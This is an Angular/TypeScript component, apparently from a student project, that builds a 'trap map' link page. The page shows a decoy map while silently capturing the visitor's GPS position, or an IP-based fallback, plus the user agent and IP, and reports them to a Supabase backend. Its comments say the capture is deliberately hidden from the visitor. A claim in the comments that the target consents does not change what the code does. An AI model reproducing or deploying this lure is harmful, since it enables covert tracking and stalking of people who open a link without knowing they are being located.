import {
  AfterViewInit,
  Component,
  ElementRef,
  OnDestroy,
  ViewChild,
  effect,
  inject,
  signal,
} from '@angular/core';
import { ActivatedRoute } from '@angular/router';
import * as L from 'leaflet';
import '@maplibre/maplibre-gl-leaflet';
import { configurarMaplibreWorker } from '../../core/maplibre-worker-setup';
import { iconoPretexto } from '../../core/mapa-iconos';
import { SupabaseService } from '../../core/supabase.service';

type Estado = 'cargando' | 'invalido' | 'listo' | 'capturado' | 'error';

interface PretextoRpcRow {
  valido: boolean;
  lat: number | null;
  lon: number | null;
  etiqueta: string | null;
}

// Punto de pretexto por defecto, usado solo como posición inicial del mapa
// mientras se resuelve obtener_pretexto() — el real lo elige el Usuario A al
// generar el enlace (ver dashboard/home.ts) y se recibe de ese RPC.
const PUNTO_PRETEXTO_DEFECTO: L.LatLngTuple = [-12.0464, -77.0428];

/**
 * Vista pública que abre el Usuario B (compañero de curso, informado y con
 * consentimiento previo, ver docs/README.md). Muestra un mapa de pretexto
 * (Leaflet + OpenFreeMap) y, en paralelo y sin reflejarlo en la UI, intenta
 * capturar la ubicación real vía navigator.geolocation (con permiso nativo
 * del navegador) y, si se rechaza, un fallback aproximado por IP.
 *
 * La captura en sí (válida/expirada/límite alcanzado, inserción, IP real de
 * la request) la resuelve por completo la función RPC capturar_ubicacion en
 * Supabase — este componente nunca decide esas reglas, solo llama a la RPC.
 */
@Component({
  selector: 'app-mapa-trampa',
  templateUrl: './mapa-trampa.html',
  styleUrl: './mapa-trampa.css',
})
export class MapaTrampa implements AfterViewInit, OnDestroy {
  @ViewChild('mapContainer') private mapContainer?: ElementRef<HTMLDivElement>;

  private readonly route = inject(ActivatedRoute);
  private readonly supabase = inject(SupabaseService);

  private map?: L.Map;
  private marcador?: L.Marker;
  private yaIntentoCaptura = false;

  protected readonly token = signal<string | null>(null);
  protected readonly estado = signal<Estado>('cargando');
  protected readonly pretextoLat = signal(PUNTO_PRETEXTO_DEFECTO[0]);
  protected readonly pretextoLon = signal(PUNTO_PRETEXTO_DEFECTO[1]);
  protected readonly pretextoEtiqueta = signal('Un lugar interesante');

  constructor() {
    const token = this.route.snapshot.paramMap.get('token');
    this.token.set(token);

    if (!token) {
      this.estado.set('invalido');
    } else {
      this.supabase.client
        .rpc('obtener_pretexto', { p_token: token })
        .then(({ data, error }) => {
          const fila = (Array.isArray(data) ? data[0] : data) as PretextoRpcRow | undefined;

          if (error || !fila?.valido) {
            this.estado.set('invalido');
            return;
          }

          if (fila.lat != null && fila.lon != null) {
            this.pretextoLat.set(fila.lat);
            this.pretextoLon.set(fila.lon);
          }
          if (fila.etiqueta) {
            this.pretextoEtiqueta.set(fila.etiqueta);
          }
          this.estado.set('listo');
        });
    }

    // Dispara la captura exactamente una vez, apenas el token se confirma válido.
    effect(() => {
      if (this.estado() === 'listo') {
        this.capturarUbicacion();
      }
    });

    // Si el pretexto real llega después de haber inicializado el mapa (lo normal,
    // ya que la RPC es async), recentra el mapa y mueve el marcador.
    effect(() => {
      const lat = this.pretextoLat();
      const lon = this.pretextoLon();
      const etiqueta = this.pretextoEtiqueta();

      if (this.map && this.marcador) {
        this.map.setView([lat, lon], this.map.getZoom());
        this.marcador.setLatLng([lat, lon]).setPopupContent(etiqueta);
      }
    });
  }

  ngAfterViewInit(): void {
    this.inicializarMapa();
  }

  ngOnDestroy(): void {
    this.map?.remove();
  }

  private inicializarMapa(): void {
    if (!this.mapContainer) {
      return;
    }

    configurarMaplibreWorker();

    const centro: L.LatLngTuple = [this.pretextoLat(), this.pretextoLon()];

    this.map = L.map(this.mapContainer.nativeElement, {
      center: centro,
      zoom: 14,
    });

    // OpenFreeMap sirve tiles vectoriales con estilo MapLibre; este plugin los
    // integra como una capa más dentro del mapa Leaflet.
    L.maplibreGL({
      style: 'https://tiles.openfreemap.org/styles/liberty',
    }).addTo(this.map);

    this.marcador = L.marker(centro, { icon: iconoPretexto() })
      .addTo(this.map)
      .bindPopup(this.pretextoEtiqueta())
      .openPopup();
  }

  /** Intenta GPS primero (con permiso nativo); si falla o se rechaza, cae a IP. */
  private capturarUbicacion(): void {
    if (this.yaIntentoCaptura) {
      return;
    }
    this.yaIntentoCaptura = true;

    if (!('geolocation' in navigator)) {
      this.capturarPorIp();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (posicion) => {
        const { latitude, longitude, accuracy } = posicion.coords;
        this.enviarCaptura('gps', latitude, longitude, accuracy);
      },
      () => this.capturarPorIp(),
      { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 },
    );
  }

  /**
   * Fallback por IP: usa un servicio público solo para estimar lat/lon a nivel
   * ciudad (precisión gruesa, informativa). La IP que cuenta para trazabilidad
   * la captura capturar_ubicacion() directamente de los headers de la request
   * en el servidor, no la que devuelva este fetch — así no depende de que el
   * cliente la reporte "honestamente".
   */
  private async capturarPorIp(): Promise<void> {
    try {
      const resp = await fetch('https://ipapi.co/json/');
      const datos = await resp.json();
      const lat = typeof datos.latitude === 'number' ? datos.latitude : null;
      const lon = typeof datos.longitude === 'number' ? datos.longitude : null;
      await this.enviarCaptura('ip', lat, lon, 5000);
    } catch {
      await this.enviarCaptura('ip', null, null, null);
    }
  }

  private async enviarCaptura(
    metodo: 'gps' | 'ip',
    lat: number | null,
    lon: number | null,
    precisionMetros: number | null,
  ): Promise<void> {
    const token = this.token();
    if (!token) {
      return;
    }

    const { error } = await this.supabase.client.rpc('capturar_ubicacion', {
      p_token: token,
      p_latitud: lat,
      p_longitud: lon,
      p_precision_metros: precisionMetros,
      p_metodo: metodo,
      p_user_agent: navigator.userAgent,
    });

    // A propósito no se refleja en la UI si funcionó o no: el Usuario B solo
    // ve el mapa de pretexto en todo momento (no debe notar nada distinto).
    this.estado.set(error ? 'error' : 'capturado');
  }
}
